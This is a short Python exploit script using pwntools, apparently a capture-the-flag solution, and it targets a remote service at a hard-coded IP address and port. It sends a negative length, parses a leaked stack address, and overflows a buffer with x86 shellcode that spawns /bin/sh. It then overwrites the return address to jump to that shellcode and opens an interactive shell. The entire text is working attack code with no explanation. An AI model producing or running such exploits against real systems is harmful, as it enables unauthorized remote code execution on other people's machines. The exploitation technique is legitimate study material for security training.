from pwn import *

# Set up the remote connection
r = remote('221.149.226.120', 31337)

# Receive the initial message
r.recvuntil(b'input length : \n')

# Send the payload length
r.sendline(b'-1')

# Receive the stack address leak
leak = r.recvuntil(b'\n')[:-1]
leak = leak.split(b':')[1].strip()
leak = int(leak, 16)

# Shellcode to spawn a shell
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

ex = shellcode + b'a'*(40-len(shellcode))    # buf
ex += b'b'*4  # sfp
ex += b'c'*4  # sfp
ex += p32(leak)

# Send the payload
r.sendline(ex)

# Interact with the spawned shell
r.interactive()